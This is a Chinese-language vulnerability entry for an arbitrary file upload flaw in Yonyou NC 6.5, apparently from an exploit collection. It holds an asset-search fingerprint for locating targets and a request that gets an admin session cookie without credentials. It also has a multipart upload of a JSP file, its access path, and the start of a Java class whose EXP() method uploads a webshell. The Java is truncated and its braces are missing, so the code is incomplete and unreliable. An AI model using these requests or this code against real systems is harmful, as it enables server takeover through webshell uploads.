# 用友NCuploadControl任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="用友 UAP"`
- **请求**：`GET /mp/loginxietong?username=admin HTTP/1.1`

**请求体 / payload**
```
1. 通过poc获取cookie
Host: xx.xx.xx.xx
X-Requested-With: XMLHttpRequest
2. 通过获取到的cookie上传文件
POST /mp/uploadControl/uploadFile HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 312
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
Cookie: JSESSIONID=633538797AC8C855098ACCFEAC78A197.server;
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="file"; filename="du1.jsp"
Content-Type: application/octet-stream
Hello Administrator!
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="submit"
上传
------WebKitFormBoundaryoDIsCqVMmF83ptmp--
3. 上传文件位置
http://xx.xx.xx.xx/mp/uploadFileDir/du1.jsp
* 传入参数
* url（系统url地址，格式<http://127.0.0.1）>
* fileName(上传wbshell文件名,格式：xx.jsp)
* webshell(webshell内容，jspwebshell)
* 方法
* `POC()`检查漏洞是否存在。当漏洞存在时返回true，并获取cookie，为cookie赋值
* `EXP()`漏洞利用，上传webshell并返回上传路径path
package yonyou;
import com.github.kevinsawicki.http.HttpRequest;
public class YonyouNC_UploadControl_Upload {
private String url;//定义用友NCurl地址
private String path;//定义漏洞path目录地址
private String cookie;//定义cookie
private String webshell;//定义webshell内容
private String fileName;//定义上传文件名
public String getUrl() {
return url;
public void setUrl(String url) {
this.url = url;
public String getPath() {
return path;
public void setPath(String path) {
this.path = path;
public String getCookie() {
return cookie;
public void setCookie(String cookie) {
this.cookie = cookie;
public String getWebshell() {
return webshell;
public void setWeb…（脚本共 2586 字，完整版见原文）
```

**其他**
- 用友NC uploadControl任意文件上传漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
* 五、漏洞利用代码（`Java`）

- 版本: * 用友NC6.5